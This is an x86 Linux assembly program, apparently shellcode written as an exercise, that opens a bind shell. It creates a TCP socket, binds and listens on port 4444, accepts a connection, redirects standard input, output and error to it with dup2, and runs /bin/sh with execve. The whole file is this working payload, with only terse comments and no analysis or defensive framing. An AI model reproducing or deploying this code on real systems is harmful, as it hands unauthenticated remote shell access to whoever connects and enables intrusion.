global _start			

section .text
_start:

	;socket
	xor eax, eax
	mov ax, 359
	mov bl, 2
	mov cl, 1
	int 0x80

	;bind
	mov ebx, eax
	mov ax, 361
	xor edx, edx		;need to have NULL padding
	push edx
	push edx
	push edx

	push word 0x5c11	;PORT Number
	push word 0x2
	
	mov ecx, esp
	mov dl, 0x10		;Padding
	int 0x80

	;listen
	mov ax, 363
	xor ecx, ecx
	int 0x80

	;accept4
	mov ax, 364
	xor edx, edx
	xor esi, esi
	int 0x80
	mov ebx, eax		;accept4 has a return value


	;dup2
	mov cl, 3
here:
	push cx
	xor eax, eax
	mov al, 63
	sub cx, 1
	int 0x80
	pop cx
	loop here		;Decrement first then check for zero
	

	;execve
	xor eax, eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp

	push eax
	mov edx, esp

	push ebx
	mov ecx, esp		;Pointer for filename address
	
	mov al, 11
	int 0x80
